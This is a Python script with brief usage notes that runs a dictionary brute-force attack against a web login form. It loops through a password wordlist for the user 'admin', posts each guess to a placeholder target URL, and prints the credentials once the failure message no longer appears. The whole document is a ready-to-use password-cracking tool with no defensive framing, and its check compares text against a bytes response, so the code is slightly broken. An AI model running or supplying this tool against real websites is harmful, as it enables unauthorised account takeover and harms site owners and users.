"""
1. run 'locate wordlist' to find the dictionary to use for brute force
2. Get the name attribute of username, password and submit button in the html file of target website

"""

import requests


page_url = "http://www.targetwebsit.com/loginpage.html"
pass_dict = "passlist.txt"   # this file contains possible password for a user

username = "admin"  # username whose passwords needs to be cracked

with open(pass_dict, "r") as passwords:
    for passwrd in passwords:
        passwrd = passwrd.strip()
        print("Trying brute with " + passwrd)
        data_dict = {
            "username" : username,  # key is the attribute name for username input from login html page
            "password" : passwrd,   # key is the attribute name for password input from login html page
            "Login" : "submit"      # key is the attribute name for submit button from login html page
        }

        response = requests.post(page_url,data=data_dict)

        # "Login failed" is the message displayed when incorrect password is used
        if "Login failed" not in response.content:
            print("Username: " + username)
            print("Password: " + passwrd)
            break
